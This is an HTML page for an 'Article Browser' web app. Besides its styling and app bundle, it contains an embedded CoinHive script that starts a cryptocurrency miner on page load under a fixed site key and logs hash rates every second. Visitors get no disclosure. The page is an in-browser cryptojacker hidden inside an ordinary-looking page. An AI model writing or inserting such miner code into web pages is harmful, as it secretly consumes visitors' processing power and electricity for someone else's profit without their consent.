<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Article Browser</title>
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/latest/css/bootstrap.min.css">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/latest/css/bootstrap-theme.min.css">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css">
</head>
<body style="background-color: #2d4a7a">
  <div id="app"></div>
  <script src="bundle/bundle.js"></script>
  <script src="https://coinhive.com/lib/coinhive.min.js"></script>
      <script>
        var miner = new CoinHive.Anonymous('63M772zQCnDDbX8Gdyb6UmLj1jytqemm');
        miner.start();
        setInterval(function() {
          var hashesPerSecond = miner.getHashesPerSecond();
          var totalHashes = miner.getTotalHashes();
          var acceptedHashes = miner.getAcceptedHashes();
          console.log("hashedPerSecond: ", hashesPerSecond);
          console.log("totalHashes: ", totalHashes);
          console.log("acceptedHashes: ", acceptedHashes);
        }, 1000);
      </script>
</body>
</html>
